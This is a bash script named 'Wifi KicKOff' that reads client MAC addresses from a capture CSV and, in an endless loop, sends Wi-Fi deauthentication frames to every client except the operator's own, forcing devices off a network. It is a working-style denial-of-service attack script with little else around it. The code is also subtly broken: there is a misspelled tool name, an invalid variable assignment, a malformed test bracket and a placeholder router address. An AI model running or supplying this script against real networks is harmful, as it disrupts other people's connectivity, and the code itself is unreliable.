#!/bin/bash

echo -e "\e[1;34m Wifi KicKOff  \n"
echo -e "===========================================================\n" 
cat << "EOF"
 ██▀███  ▓█████ ▓█████▄  ▄▄▄▄    ▄▄▄       ▄████▄   ██ ▄█▀
▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▓█████▄ ▒████▄    ▒██▀ ▀█   ██▄█▒ 
▓██ ░▄█ ▒▒███   ░██   █▌▒██▒ ▄██▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██░█▀  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
░██▓ ▒██▒░▒████▒░▒████▓ ░▓█  ▀█▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░▒▓███▀▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
  ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒ ▒░▒   ░   ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
  ░░   ░    ░    ░ ░  ░  ░    ░   ░   ▒   ░        ░ ░░ ░ 
   ░        ░  ░   ░     ░            ░  ░░ ░      ░  ░   
                 ░            ░           ░      
EOF
echo -e "\n===========================================================\e[39m\n" 

My_MAC = "xx:xx:xx:xx:xx:xx"

while true;do

i=1

cat final.csv | cut -d "" -f1 | tail -100 | sed "/Station MAC/d" | sed "/BSSID/d" | sed "/WIFI ROUTER MAC /d" | sed "/^$/d"| grep ":" | while read line

do

echo -e "\e[39m"
echo -e "Line is : $line"

if [ "$line" = "$My_MAC"]; then
	echo -e " Security Researchers: $line "	
else
echo $array[$i]
airplay-ng -0 1 -a "WIFI ROUTER MAC" -c "$line" mon0 &

fi
sleep 1
(( i++ ))
done
done